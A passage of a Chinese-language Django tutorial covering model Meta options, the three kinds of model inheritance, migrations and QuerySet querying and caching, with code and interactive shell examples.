verbose_name = "story"
verbose_name = "披萨"

verbose_name_plural
英语有单数和复数形式,这个就是模型对象的复数名,比如"apples"。因为中文通常不区分单复数,所以保持和verbose_name一致也可以。
如果不指定该选项,那么默认的复数名字是verbose_name加上's'
verbose_name_plural = "stories"
verbose_name_plural = "披萨"

label
前面介绍的元数据都是可修改和设置的,但还有两个只读的元数据,label就是其中之一。
label等同于app_label.object_name,例如polls.Question,polls是应用名,Question是模型名。

label_lower
同上,不过是小写的模型名。

</pre>

<h4>模型的继承</h4><pre>
Django中所有的模型都必须继承django.db.models.Model模型,不管是直接继承也好,还是间接继承也罢。
唯一需要决定的是父模型是否是一个独立自主的、同样在数据库中创建数据表的模型,还是一个只用来保存子模型共有内容、并不实际创建数据表的抽象模型。
同Python的继承一样,Django也是可以同时继承两个以上父类的

Django有三种继承的方式:
抽象基类:被用来继承的模型被称为Abstract base classes,将子类共同的数据抽离出来,供子类继承重用,它不会创建实际的数据表;
多表继承:Multi-table inheritance,每一个模型都有自己的数据库表;
代理模型:如果只想修改模型的Python层面的行为,并不想改动模型的字段,可以使用代理模型。

抽象基类:
只需要在模型的Meta类里添加abstract=True元数据项就可以将一个模型转换为抽象基类。Django不会为这种类创建实际的数据库表,它们也没有管理器,不能被实例化也无法直接保存,它们就是用来被继承的。抽象基类完全就是用来保存子模型们共有的内容部分,达到重用的目的。当它们被继承时它们的字段会全部复制到子模型中

</pre>Student模型将拥有name,age,home_group三个字段,并且CommonInfo模型不能当做一个正常的模型使用<textarea>
class CommonInfo(models.Model):
    name = models.CharField(max_length=100)
    age = models.PositiveIntegerField()

    class Meta:
        abstract = True

class Student(CommonInfo):
    home_group = models.CharField(max_length=5)

</textarea>如果子类没有声明自己的Meta类,那么它将继承抽象基类的Meta类<textarea>
class CommonInfo(models.Model):
    # ...
    class Meta:
        abstract = True
        ordering = ['name']

class Student(CommonInfo):
    # ...
    class Meta(CommonInfo.Meta):  # 扩展了基类的Meta
        db_table = 'student_info'

</textarea><pre>
抽象基类中有的元数据,子模型没有的话,直接继承;
抽象基类中有的元数据,子模型也有的话,直接覆盖;
子模型可以额外添加元数据;
抽象基类中的abstract=True这个元数据不会被继承。也就是说如果想让一个抽象基类的子模型,同样成为一个抽象基类,那必须显式的在该子模型的Meta中同样声明一个abstract = True;
有一些元数据对抽象基类无效,比如db_table,首先是抽象基类本身不会创建数据表,其次它的所有子类也不会按照这个元数据来设置表名。

related_name和related_query_name参数
如果在抽象基类中存在ForeignKey或ManyToManyField字段,并且使用了related_name或related_query_name参数,那么一定要小心了。因为按照默认规则,每一个子类都将拥有同样的字段,这显然会导致错误。为了解决这个问题,当在抽象基类中使用related_name或related_query_name参数时它们两者的值中应该包含%(app_label)s和%(class)s部分:
%(class)s用字段所属子类的小写名替换
%(app_label)s用子类所属app的小写名替换
当然如果不设置related_name或related_query_name参数,这些问题就不存在了

</pre><textarea>
# 例如对于common/models.py模块:
from django.db import models
class Base(models.Model):
    m2m = models.ManyToManyField(
        OtherModel,
        related_name="%(app_label)s_%(class)s_related",
        related_query_name="%(app_label)s_%(class)ss",
    )

    class Meta:
        abstract = True

class ChildA(Base):
    pass

class ChildB(Base):
    pass

# 对于另外一个应用中的rare/models.py:
from common.models import Base
class ChildB(Base):
    pass

对于上面的继承关系:
common.ChildA.m2m字段的reverse name(反向关系名)应该是common_childa_related;reverse query name(反向查询名)应该是common_childas。
common.ChildB.m2m字段的反向关系名应该是common_childb_related;反向查询名应该是common_childbs。
rare.ChildB.m2m字段的反向关系名应该是rare_childb_related;反向查询名应该是rare_childbs。

</textarea><pre>
多表继承
这种继承方式下,父类和子类都是独立自主、功能完整、可正常使用的模型,都有自己的数据库表,内部隐含了一个一对一的关系

</pre><textarea>
class Place(models.Model):
    name = models.CharField(max_length=50)
    address = models.CharField(max_length=80)

# 餐厅模型类
class Restaurant(Place):
    serves_hot_dogs = models.BooleanField(default=False)
    serves_pizza = models.BooleanField(default=False)

# Restaurant将包含Place的所有字段,并且各有各的数据库表和字段
>>> Place.objects.filter(name="Bob's Cafe")
>>> Restaurant.objects.filter(name="Bob's Cafe")

# 如果一个Place对象同时也是一个Restaurant对象,可以使用小写的子类名在父类中访问它
>>> p = Place.objects.get(id=12)
# 如果p也是一个Restaurant对象,那么下面的调用可以获得该Restaurant对象。
>>> p.restaurant
< Restaurant: ...>

# 但如果这个Place是个纯粹的Place对象,并不是一个Restaurant对象,那么上面的调用方式会弹出Restaurant.DoesNotExist异常。
>>> from app1.models import Place, Restaurant  # 导入两个模型到shell里
>>> p1 = Place.objects.create(name='coff',address='address1')
>>> p1              # p1是个纯Place对象
< Place: Place object>
>>> p1.restaurant   # p1没有餐馆属性
django.db.models.fields.related_descriptors.RelatedObjectDoesNotExist: Place has no restaurant.
>>> r1 = Restaurant.objects.create(serves_hot_dogs=True,serves_pizza=False)
>>> r1              # r1在创建的时候,只赋予了2个字段的值
< Restaurant: Restaurant object>
>>> r1.place        # 不能这么调用
AttributeError: 'Restaurant' object has no attribute 'place'

>>> r2 = Restaurant.objects.create(serves_hot_dogs=True,serves_pizza=False, name='pizza', address='address2')
>>> r2              # r2在创建时提供了包括Place的字段在内的4个字段
< Restaurant: Restaurant object>
>>> r2.place        # 可以看出这么调用都是非法的
AttributeError: 'Restaurant' object has no attribute 'place'
>>> p2 = Place.objects.get(name='pizza') # 通过name获取到了一个Place对象
>>> p2.restaurant   # 这个P2其实就是前面的r2
< Restaurant: Restaurant object>
>>> p2.restaurant.address
'address2'
>>> p2.restaurant.serves_hot_dogs
True

>>> lis = Place.objects.all()
>>> lis
< QuerySet [< Place: Place object>, < Place: Place object>, < Place: Place object>]>
>>> lis.values()
< QuerySet [{'id': 1, 'name': 'coff', 'address': 'address1'}, {'id': 2, 'name': '', 'address': ''}, {'id': 3, 'name': 'pizza', 'address': 'address2'}]>
>>> lis[2]
< Place: Place object>
>>> lis[2].serves_hot_dogs
AttributeError: 'Place' object has no attribute 'serves_hot_dogs'

>>> lis2 = Restaurant.objects.all()
>>> lis2
< QuerySet [< Restaurant: Restaurant object>, < Restaurant: Restaurant object>]>
>>> lis2.values()
< QuerySet [{'id': 2, 'name': '', 'address': '', 'place_ptr_id': 2, 'serves_hot_dogs': True, 'serves_pizza': False}, {'id': 3, 'name': 'pizza', 'address
': 'address2', 'place_ptr_id': 3, 'serves_hot_dogs': True, 'serves_pizza': False}]>

# 其机制内部隐含的OneToOne字段,形同下面所示:
place_ptr = models.OneToOneField(Place, on_delete=models.CASCADE, parent_link=True)
可以通过创建一个OneToOneField字段并设置parent_link=True,自定义这个一对一字段

</textarea><pre>
Meta和多表继承
在多表继承的情况下,由于父类和子类都在数据库内有物理存在的表,父类的Meta类会对子类造成不确定的影响,因此Django在这种情况下关闭了子类继承父类的Meta功能。这一点和抽象基类的继承方式有所不同。

但是还有两个Meta元数据特殊一点,那就是ordering和get_latest_by,这两个参数是会被继承的。因此如果在多表继承中不想让子类继承父类的上面两种参数就必须在子类中显示的指出或重写

</pre><textarea>
class ChildModel(ParentModel):
    # ...

    class Meta:
        # 移除父类对子类的排序影响
        ordering = []

</textarea><pre>
多表继承和反向关联
因为多表继承使用了一个隐含的OneToOneField来链接子类与父类,所以象上例那样可以从父类访问子类。但这个OnetoOneField字段默认的related_name值与ForeignKey和 ManyToManyField默认的反向名称相同。如果与父类或另一个子类做多对一或是多对多关系就必须在每个多对一和多对多字段上强制指定related_name。如果没这么做Django就会在运行或验证(validation)时抛出异常。

</pre>创建一个带有ManyToManyField字段的子类<textarea>
class Place(models.Model):
    name = models.CharField(max_length=50)
    address = models.CharField(max_length=80)

class Supplier(Place):
    customers = models.ManyToManyField(Place)

# 这会产生下面的错误:
Reverse query name for 'Supplier.customers' clashes with reverse query
name for 'Supplier.place_ptr'.
HINT: Add or change a related_name argument to the definition for
'Supplier.customers' or 'Supplier.place_ptr'.

# 解决方法是:向customers字段中添加related_name参数.
customers = models.ManyToManyField(Place, related_name='provider')。

</textarea><pre>
代理模型
使用多表继承时父类的每个子类都会创建一张新数据表,通常情况下这是想要的操作,因为子类需要一个空间来存储不包含在父类中的数据。但有时可能只想更改模型在Python层面的行为,比如更改默认的manager管理器或添加一个新方法,代理模型就是为此而生的。可以创建、删除、更新代理模型的实例,并且所有的数据都可以像使用原始模型(非代理类模型)一样被保存。不同之处在于可以在代理模型中改变默认的排序方式和默认的manager管理器等,而不会对原始模型产生影响。
声明一个代理模型只需要将Meta中proxy的值设为True。

</pre>给Person模型添加一个方法<textarea>
class Person(models.Model):
    first_name = models.CharField(max_length=30)
    last_name = models.CharField(max_length=30)

class MyPerson(Person):
    class Meta:
        proxy = True

    def do_something(self):
        # ...
        pass

# MyPerson类将操作和Person类同一张数据库表,并任何新的Person实例都可以通过MyPerson类进行访问,反之亦然。
>>> p = Person.objects.create(first_name="foobar")
>>> MyPerson.objects.get(first_name="foobar")
< MyPerson: foobar>

# 通过代理进行排序,但父类却不排序:
class OrderedPerson(Person):
    class Meta:
        # 现在普通的Person查询是无序的,而OrderedPerson查询会按照`last_name`排序。
        ordering = ["last_name"]
        proxy = True

</textarea><pre>
一些约束:
代理模型必须继承自一个非抽象的基类,并且不能同时继承多个非抽象基类;
代理模型可以同时继承任意多个抽象基类,前提是这些抽象基类没有定义任何模型字段。
代理模型可以同时继承多个别的代理模型,前提是这些代理模型继承同一个非抽象基类。(早期Django版本不支持这一条)

代理模型的管理器
如不指定则继承父类的管理器,如果自定义了管理器,那它就会成为默认管理器,但是父类的管理器依然有效

</pre><textarea>
class NewManager(models.Manager):
    # ...
    pass

class MyPerson(Person):
    objects = NewManager()

    class Meta:
        proxy = True

# 如果想要向代理中添加新的管理器,而不是替换现有的默认管理器,可以创建一个含有新的管理器的基类,并在继承时把他放在主基类的后面:
# Create an abstract class for the new manager.
class ExtraManagers(models.Model):
    secondary = NewManager()

    class Meta:
        abstract = True

class MyPerson(Person, ExtraManagers):
    class Meta:
        proxy = True

</textarea><pre>
多重继承
多重继承和多表继承是两个不同的概念。
Django的模型体系支持多重继承,就像Python一样。如果多个父类都含有Meta类则只有第一个父类的会被使用,剩下的会忽略掉。
一般情况,能不要多重继承就不要,尽量让继承关系简单和直接,避免不必要的混乱和复杂。
继承同时含有相同id主键字段的类将抛出异常。为了解决这个问题可以在基类模型中显式的使用AutoField字段

</pre><textarea>
class Article(models.Model):
    article_id = models.AutoField(primary_key=True)

class Book(models.Model):
    book_id = models.AutoField(primary_key=True)

class BookReview(Book, Article):
    pass

# 或者使用一个共同的祖先来持有AutoField字段,并在直接的父类里通过一个OneToOne字段保持与祖先的关系
class Piece(models.Model):
    pass

class Article(Piece):
    article_piece = models.OneToOneField(Piece, on_delete=models.CASCADE, parent_link=True)

class Book(Piece):
    book_piece = models.OneToOneField(Piece, on_delete=models.CASCADE, parent_link=True)

class BookReview(Book, Article):
    pass

</textarea><pre>
在Python语言层面,子类可以拥有和父类相同的属性名,这样会造成覆盖现象。但是对于Django,如果继承的是一个非抽象基类,那么子类与父类之间不可以有相同的字段名！

</pre><textarea>
class A(models.Model):
    name = models.CharField(max_length=30)

class B(A):
    name = models.CharField(max_length=30)

# 执行python manage.py makemigrations会弹出下面的错误:
django.core.exceptions.FieldError: Local field 'name' in class 'B' clashes with field of the same name from base class 'A'.

# 但是如果父类是个抽象基类就没有问题了
class A(models.Model):
    name = models.CharField(max_length=30)

    class Meta:
        abstract = True

class B(A):
    name = models.CharField(max_length=30)

</textarea><pre>
【 用包来组织模型 】
在使用python manage.py startapp xxx命令创建新的应用时Django会自动们建立一个应用的基本文件组织结构,其中就包括一个models.py文件。通常把当前应用的模型都编写在这个文件里,但是如果模型很多,那么将单独的models.py文件分割成一些独立的文件是个更好的做法。

首先需要在应用中新建一个叫做models的包,再在包下创建一个__init__.py文件,这样才能确立包的身份。然后将models.py文件中的模型分割到一些.py文件中,比如organic.py和synthetic.py,然后删除models.py文件。最后在__init__.py文件中导入所有的模型

#  myapp/models/__init__.py
from .organic import Person
from .synthetic import Robot

要显式明确地导入每一个模型,而不要使用from .models import *的方式,这样不会混淆命名空间,让代码更可读,更容易被分析工具使用。

</pre>

<h4>激活使用模型</h4><pre>
通过创建模型Django可以:
创建该app对应的数据库表结构,为这个应用创建数据库schema即生成CREATE TABLE语句
为Question和Choice对象创建基于Python的数据库访问API

首先把polls应用安装到项目里来使用该app,告诉Django准备使用已经创建好的模型
Django应用是"可插拔"的,可以在多个项目中使用同一个应用,此外还可以发布自己的应用,因为它们并不会被绑定到当前安装的Django上。
为了在工程中包含这个应用,需要在配置文件中的INSTALLED_APPS中添加包含models.py文件的模块名称即startapp创建的应用名称polls
因为该app的配置类文件PollsConfig时polls/apps.py,所以它的点式路径是'polls.apps.PollsConfig',在mysite/settings.py中INSTALLED_APPS子项追加'polls.apps.PollsConfig',在多数情况下简写成'polls'就可以了

现在Django项目会包含polls应用,接着通过运行makemigrations命令告诉Django模型有改动,Django会检测对模型文件的修改,并把这些改动保存为一个迁移(migration)
$ python3 manage.py makemigrations polls
Migrations for 'polls':
  polls/migrations/0001_initial.py:
    - Create model Choice
    - Create model Question

migrations是Django保存模型修改记录的文件,这些文件保存在磁盘上。在例子中它就是polls/migrations/0001_initial.py,里面保存的都是人类可读并且可编辑的内容,方便随时手动修改

Django有一个自动执行数据库迁移并同步管理数据库结构的命令migrate,首先看看迁移命令会执行哪些SQL语句。sqlmigrate命令接收一个迁移的名称,然后返回对应的SQL,Django依据配置文件中指定的数据库后端生成对应的SQL语句

</pre><textarea>
$ python3 manage.py sqlmigrate polls 0001

BEGIN;
--
-- Create model Question
--
CREATE TABLE "polls_question" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "question_text" varchar(200) NOT NULL, "pub_date" datetime NOT NULL);
--
-- Create model Choice
--
CREATE TABLE "polls_choice" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "choice_text" varchar(200) NOT NULL, "votes" integer NOT NULL, "question_id" integer NOT NULL REFERENCES "polls_question" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE INDEX "polls_choice_question_id_c5b4b260" ON "polls_choice" ("question_id");
COMMIT;

</textarea><pre>
数据库的表名默认是由应用名(polls)和模型名的小写形式(question和choice)连接自动生成的,可自定义此行为
Django默认自动创建自增主键id,也可以自己指定主键
默认的Django会在外键字段名后追加字符串"_id",也可以自定义
外键关系由FOREIGN KEY生成,DEFERRABLE部分只是告诉数据库在事务全都执行完之后再创建外键关系
生成的SQL语句是为所用的数据库定制的,所以那些和数据库有关的字段类型,比如auto_increment(MySQL)、 serial(PostgreSQL)和integer primary key autoincrement(SQLite),Django会自动处理,使用单引号还是双引号也一样会被自动处理。
这个sqlmigrate命令并没有真正在数据库中的执行迁移,只是把命令输出到屏幕上显示Django认为需要执行哪些SQL语句

可以运行python manage.py check;命令帮助检查项目中的问题,并不实际进行迁移或者链接数据库的操作

运行migrate命令,在数据库里创建新定义的模型的数据表,在数据库中进行真正的表操作:
$ python3 manage.py migrate
Operations to perform:
    Apply all migrations: admin, auth, contenttypes, polls, sessions
Running migrations:
    Rendering model states... DONE
    Applying polls.0001_initial... OK

migrate命令对所有还未实施的迁移记录进行操作,本质上就是将模型的修改体现到数据库中具体的表上面
Django通过在数据库中创建一个特殊的表django_migrations来记录跟踪执行过哪些迁移,通过对比获得哪些migrations尚未提交,并应用在数据库上,也就是将对模型的更改同步到数据库结构上。

Running migrations: No migrations to apply,django不能创建数据库中的表的问题
第一步:删除该app名字下的migrations下的__init__.py等文件。
第二步:进入数据库,找到django_migrations的表,删除该app名字的所有记录。
第三步:执行下面这两条命令:(在项目目录下)
python manage.py makemigrations
python manage.py migrate
原因:
django_migrations表记录着数据库的对应表的修改记录。
每次修改后,都执行第三步的命令,然后在第一步的文件夹下生成修改的文件,django_migrations表记录修改的变更过程。

migrations的功能非常强大,允许随时修改模型改变数据库结构而不需要删除或新建数据库或数据表,在不丢失数据的同时实时动态更新数据库,它专注于使数据库平滑升级而不会丢失数据

改变模型需要这三步:
编辑models.py文件改变模型。
运行python3 manage.py makemigrations [appName] 把模型修改动作保存到记录文件中继生成迁移记录文件,方便github等工具的使用
运行python3 manage.py migrate来应用数据库迁移,将操作同步到数据库

之所以要将创建和实施迁移的动作分成两个命令两步走是因为也许要通过版本控制系统如github提交项目代码,为了能够在代码控制系统上提交迁移数据并使其能在多个应用里使用,如果没有一个中间过程的保存文件(migrations),那么github如何知道以及记录、同步、实施进行过的模型修改动作呢？毕竟,github不和数据库直接打交道,也没法和本地的数据库通信。但是分开之后,只需要将migration文件如0001上传到github,它就会知道一切;这不仅仅会让开发更加简单,也给别的开发者和生产环境中的使用带来方便

</pre>

<h4>使用模型的API</h4><pre>
进入Python交互环境,尝试使用Django提供的数据库访问API
$ python3 manage.py shell

相比较直接输入"python"命令的方式进入Python环境,调用manage.py参数能将DJANGO_SETTINGS_MODULE环境变量导入,它将自动按照mysite/settings.py中的设置,配置好python shell环境,这样就可以导入和调用任何项目内的模块了。

或者也可以这样,先进入一个纯净的python shell环境,然后启动Django
>>> import django
>>> django.setup()

</pre>成功进入命令行后试试database API,这部分内容是Django项目的核心,也是动态网站与数据库交互的核心<textarea>
>>> from polls.models import Choice, Question

# 现在系统内还没有questions对象
>>> Question.objects.all()
< QuerySet []>

# Create a new Question.Django推荐使用timezone.now()代替python内置的datetime.datetime.now(),这个timezone就来自于Django的依赖库pytz,Support for time zones is enabled in the default settings file, so Django expects a datetime with tzinfo for pub_date
>>> from django.utils import timezone
>>> q = Question(question_text="What's new?", pub_date=timezone.now())
# Save the object into the database. You have to call save() explicitly.
>>> q.save()
# 默认会自动获得一个自增的名为id的主键
>>> q.id
1
# Access model field values via Python attributes.
>>> q.question_text
"What's new?"
>>> q.pub_date
datetime.datetime(2012, 2, 26, 13, 0, 0, 775217, tzinfo=< UTC>)

# Change values by changing the attributes, then calling save().
>>> q.question_text = "What's up?"
>>> q.save()
# objects.all() displays all the questions in the database.
>>> Question.objects.all()
< QuerySet [< Question: Question object (1)>]>

# < Question: Question object (1)>对于了解这个对象的细节没什么帮助,通过编辑Question模型的代码polls/models.py来修复这个问题,给Question和Choice模型类增加__str__()方法,这不仅仅能在命令行里打印对象带来方便,Django自动生成的admin站点里也使用这个方法来表示对象

class Question(models.Model):
    def __str__(self):
        return self.question_text

class Choice(models.Model):
    def __str__(self):
        return self.choice_text

# 添加一个自定义的方法用于判断问卷是否最近时间段内发布度的
from django.db import models
import datetime                    # python内置的datetime
from django.utils import timezone  # 导入Django中和时区相关的django.utils.timezone工具模块
class Question(models.Model):
    def was_published_recently(self):
        return self.pub_date >= timezone.now() - datetime.timedelta(days=1)

# 保存文件然后通过python3 manage.py shell命令再次打开Python交互式命令行:
>>> from polls.models import Choice, Question
# Make sure our __str__() addition worked.
>>> Question.objects.all()
< QuerySet [< Question: What's up?>]>

# Django provides a rich database lookup API that's entirely driven by keyword arguments.
>>> Question.objects.filter(id=1)
< QuerySet [< Question: What's up?>]>
>>> Question.objects.filter(question_text__startswith='What')
< QuerySet [< Question: What's up?>]>

# Get the question that was published this year.
>>> from django.utils import timezone
>>> current_year = timezone.now().year
>>> Question.objects.get(pub_date__year=current_year)
< Question: What's up?>

# Request an ID that doesn't exist, this will raise an exception.
>>> Question.objects.get(id=2)
DoesNotExist: Question matching query does not exist.

# Lookup by a primary key is the most common case, so Django provides a shortcut for primary-key exact lookups. The following is identical to Question.objects.get(id=1).
>>> Question.objects.get(pk=1)
< Question: What's up?>

# Make sure our custom method worked.
>>> q = Question.objects.get(pk=1)
>>> q.was_published_recently()
True

# Give the Question a couple of Choices. The create call constructs a new Choice object, does the INSERT statement, adds the choice to the set of available choices and returns the new Choice object. Django creates a set to hold the "other side" of a ForeignKey relation (e.g. a question's choice) which can be accessed via the API.
>>> q = Question.objects.get(pk=1)
# Display any choices from the related object set -- none so far.
>>> q.choice_set.all()
< QuerySet []>

# Create three choices.
>>> q.choice_set.create(choice_text='Not much', votes=0)
< Choice: Not much>
>>> q.choice_set.create(choice_text='The sky', votes=0)
< Choice: The sky>
>>> c = q.choice_set.create(choice_text='Just hacking again', votes=0)
# Choice objects have API access to their related Question objects.
>>> c.question
< Question: What's up?>

# And vice versa: Question objects get access to Choice objects.
>>> q.choice_set.all()
< QuerySet [< Choice: Not much>, < Choice: The sky>, < Choice: Just hacking again>]>
>>> q.choice_set.count()
3

# API会自动进行连表操作,通过双下划线分割关系对象。连表操作可以无限多级,一层一层的连接,查询所有的Choices,它所对应的Question的发布日期是今年
>>> Choice.objects.filter(question__pub_date__year=current_year)
< QuerySet [< Choice: Not much>, < Choice: The sky>, < Choice: Just hacking again>]>

# 使用delete方法删除对象
>>> c = q.choice_set.filter(choice_text__startswith='Just hacking')
>>> c.delete()

</textarea><pre>
【 执行查询操作 】
一旦创建数据模型后,Django自动给予一套数据库抽象API,允许创建,检索,更新和删除对象

</pre>python3 manage.py startapp webblog,引用以下模型,这些模型包含了一个bblog应用<textarea>
class Blog(models.Model):
    name = models.CharField(max_length=100)
    tagline = models.TextField()

    def __str__(self): return self.name

class Author(models.Model):
    name = models.CharField(max_length=200)
    email = models.EmailField()

    def __str__(self): return self.name

class Entry(models.Model):
    blog = models.ForeignKey(Blog, on_delete=models.CASCADE)
    headline = models.CharField(max_length=255)
    body_text = models.TextField()
    pub_date = models.DateField()
    mod_date = models.DateField()
    authors = models.ManyToManyField(Author)
    n_comments = models.IntegerField()
    n_pingbacks = models.IntegerField()
    rating = models.IntegerField()

    def __str__(self): return self.headline

</textarea><pre>
【 创建对象 】
为了用Python对象展示数据表对象,Django使用了一套直观的系统:一个模型类代表一张数据表,一个模型类的实例代表数据库表中的一行记录。
要创建一个对象,用关键字参数初始化它,然后调用save()将其存入数据库,模型实例的save()在幕后执行了INSERT SQL语句,该方法没有返回值,它可以接受一些额外的参数
要一步创建并保存一个对象,使用create()方法
要将修改保存至数据库中已有的某个对象,使用save(),这在幕后执行了UPDATE SQL语句,Django在显示调用save()后才操作数据库

假设模型都位于文件mysite/blog/models.py中,这是一个例子:

>>> from blog.models import Blog
>>> b = Blog(name='Beatles Blog', tagline='All the latest Beatles news.')
>>> b.save()
>>> b = Blog.objects.create(name='Beatles Blog', tagline='All the latest Beatles news.')
>>> b.name = 'New name'
>>> b.save()

保存ForeignKey和ManyToManyField字段
更新ForeignKey字段的方式与保存普通字段的方式相同,只需将正确类型的实例分配给相关字段
有一个Entry的实例entry和一个Blog的实例cheese_blog,然后把cheese_blog作为值赋给了entry的blog属性,最后调用save方法进行保存
>>> from blog.models import Blog, Entry
>>> entry = Entry.objects.get(pk=1)
>>> cheese_blog = Blog.objects.get(name="Cheddar Talk")
>>> entry.blog = cheese_blog
>>> entry.save()

更新ManyToManyField字段有点不同,在字段上使用add()方法为关联关系添加一条记录,而不是直接给属性赋值,但它不需要调用save方法
>>> from blog.models import Author
>>> joe = Author.objects.create(name="Joe")
>>> # 将Author实例joe添加至entry对象
>>> entry.authors.add(joe)

>>> # 要一次添加多行记录即多个对象到ManyToManyField字段,在一次调用add()时传入多个参数
>>> john = Author.objects.create(name="John")
>>> paul = Author.objects.create(name="Paul")
>>> george = Author.objects.create(name="George")
>>> ringo = Author.objects.create(name="Ringo")
>>> entry.authors.add(john, paul, george, ringo)

</pre>

<h4>检索对象</h4><pre>
all()、get()、filter()、exclude()和order_by()
从数据库检索对象要通过模型类的管理器(Manager)构造一个查询结果集(QuerySet),一个QuerySet代表来自数据库中对象的一个集合,它可以有0或多个过滤器filters,在SQL语法中一个QuerySet相当于一个SELECT语句,而filter则相当于WHERE或LIMIT一类的子句

管理器Manager是一种接口,赋予了Django模型操作数据库的能力,Django应用中每个模型拥有至少一个Manager,能通过模型的Manager获取QuerySet,Manager默认名称是objects,可以在模型类中通过people = models.Manager()重命名Mnager为people

默认模型的Manager被称作objects,可通过模型类直接调用它,但不能通过模型类的实例调用它,以此实现"表级别"操作和"记录级别"操作的强制分离
Manager是模型的QuerySets主要来源,例如Blog.objects.all()返回了一个包含了数据库中所有的Blog对象的QuerySet

>>> Blog.objects
< django.db.models.manager.Manager object at ...>
>>> b = Blog(name='Foo', tagline='Bar')
>>> b.objects
AttributeError: "Manager isn't accessible via Blog instances."

>>> print([e for e in dir(Blog.objects) if not e.startswith('_')])
['aggregate', 'all', 'annotate', 'auto_created', 'bulk_create', 'check', 'complex_filter', 'contribute_to_class', 'count', 'create', 'creation_counter', 'dates', 'datetimes', 'db', 'db_manager', 'deconstruct', 'defer', 'difference', 'distinct', 'earliest', 'exclude', 'exists', 'extra', 'filter', 'first', 'from_queryset', 'get', 'get_or_create', 'get_queryset', 'in_bulk', 'intersection', 'iterator', 'last', 'latest', 'model', 'name', 'none', 'only', 'order_by', 'prefetch_related', 'raw', 'reverse', 'select_for_update', 'select_related', 'union', 'update', 'update_or_create', 'use_in_migrations', 'using', 'values', 'values_list']

【 all()检索全部对象 】
从数据库中检索对象最简单的方式就是检索全部,为此在Manager上调用all()方法返回一个包含数据库中所有对象的QuerySet对象
>>> all_entries = Entry.objects.all()

【 QuerySet是惰性的 】
一个创建QuerySets的动作不会立刻导致任何的数据库行为,可以不断地进行filter动作,Django不会运行任何实际的数据库查询动作,直到QuerySets被提交(evaluated)。只有碰到某些特定的操作,Django才会将所有的操作体现到数据库内,否则它们只是保存在内存和Django的层面中。这是一种提高数据库查询效率,减少操作次数的优化设计
>>> q = Entry.objects.filter(headline__startswith="What")
>>> q = q.filter(pub_date__lte=datetime.date.today())
>>> q = q.exclude(body_text__icontains="food")
>>> print(q)
看起来执行了3次数据库访问,实际上只是在print语句时才执行1次访问。通常情况,QuerySets的检索不会立刻执行实际的数据库查询操作,直到出现类似print的请求,也就是所谓的evaluated

【 缓存与查询集QuerySet 】
每个QuerySet都包含一个缓存,用于减少对数据库的实际操作,理解这个概念有助于提高查询效率。
对于新创建的QuerySet,它的缓存是空的。当QuerySet第一次被提交后,数据库执行实际的查询操作,Django会把查询的结果保存在QuerySet的缓存内,随后的对于该QuerySet的提交将重用这个缓存的数据。

要想高效的利用查询结果,降低数据库负载,必须善于利用缓存。下面的例子这会造成2次实际的数据库操作,加倍数据库的负载,同时由于时间差的问题,可能在两次操作之间数据被删除或修改或添加,导致脏数据的问题
>>> print([e.headline for e in Entry.objects.all()])
>>> print([e.pub_date for e in Entry.objects.all()])

要避免此问题,简单地保存QuerySet并复用它:
>>> queryset = Entry.objects.all()
>>> print([p.headline for p in queryset]) # 提交查询
>>> print([p.pub_date for p in queryset]) # 重用查询缓存

何时不会被缓存
有一些操作不会缓存QuerySet,例如切片和索引,这就导致这些操作没有缓存可用,每次都会执行实际的数据库查询操作
>>> queryset = Entry.objects.all()
>>> print(queryset[5]) # 查询数据库
>>> print(queryset[5]) # 再次查询数据库

但如果已经遍历过整个QuerySet,那么就相当于缓存过,后续的操作则会使用缓存
>>> queryset = Entry.objects.all()
>>> [entry for entry in queryset] # 查询数据库
>>> print(queryset[5]) # 使用缓存
>>> print(queryset[5]) # 使用缓存

下面的这些操作都将遍历QuerySet并建立缓存:
>>> [entry for entry in queryset]
>>> bool(queryset)
>>> entry in queryset
>>> list(queryset)

简单的打印QuerySet并不会建立缓存,因为__repr__()调用只返回全部查询集的一个切片

【 限制QuerySet条目数 】
QuerySets是一个集合类型对象,可以简单的理解为Python列表,可迭代可循环可索引。

利用Python的数组切片语法将QuerySet切成指定长度,等价于SQL的LIMIT和OFFSET子句,不支持负索引如Entry.objects.all()[-1]
>>> Entry.objects.all()[:5]    # 返回前5个对象 (LIMIT 5)
>>> Entry.objects.all()[5:10]  # 返回第6至第10个对象 (OFFSET 5 LIMIT 5)

通常QuerySet的切片返回一个新的QuerySet,并且不会立即执行,特殊情况是使用了的Python切片语法的"步长"时查询操作会like在数据库内执行
>>> Entry.objects.all()[:10:2]
由于对queryset切片工作方式的模糊性,禁止对其进行进一步的排序或过滤。

若要获取单一的对象而不是一个列表例如SELECT foo FROM bar LIMIT 1,可以简单地使用索引而不是切片
>>> Entry.objects.order_by('headline')[0]
相当于:
>>> Entry.objects.order_by('headline')[0:1].get()
如果没有匹配到对象,那么第一种方法会抛出IndexError异常,而第二种方式会抛出DoesNotExist异常,即使用get和切片时要注意查询结果的元素个数

【 通过过滤器检索指定对象,过滤对象 】
要创建一个完整对象集合的一个子集需要通过添加过滤条件原始QuerySet,两种最常见的过滤QuerySet的方式是:
1、filter(**kwargs)返回一个新的QuerySet,包含的对象满足给定查询参数。
2、exclude(**kwargs)返回一个新的QuerySet,包含的对象不满足给定查询参数。
查询参数(**kwargs)应该符合Field lookups的要求,**kwargs参数的格式必须是Django设置的一些字段格式

filter()总返回一个QuerySet,即便只有一个对象符合过滤条件返回的也是包含一个对象的QuerySets

# 包含获取2006年的博客条目(entries blog)的QuerySet
Entry.objects.filter(pub_date__year=2006)
Entry.objects.all().filter(pub_date__year=2006) # 同上

链式过滤器
filter和exclude的结果依然是个QuerySet,因此它可以继续被filter和exclude,这就形成了链式过滤
# 最终的QuerySet包含标题以"What"开头的,发布日期介于2005年1月30日与今天之间的所有条目
Entry.objects.filter(
    headline__startswith='What'
).exclude(
    pub_date__gte=datetime.date.today()
).filter(
    pub_date__gte=datetime.date(2005, 1, 30)
)

被过滤的QuerySets都是唯一的
每次过滤一个QuerySet就会获得一个全新的QuerySet,后者与前者毫无关系,可以完全独立的被保存使用和重用
>>> q1 = Entry.objects.filter(headline__startswith="What")
>>> q2 = q1.exclude(pub_date__gte=datetime.date.today())
>>> q3 = q1.filter(pub_date__gte=datetime.date.today())
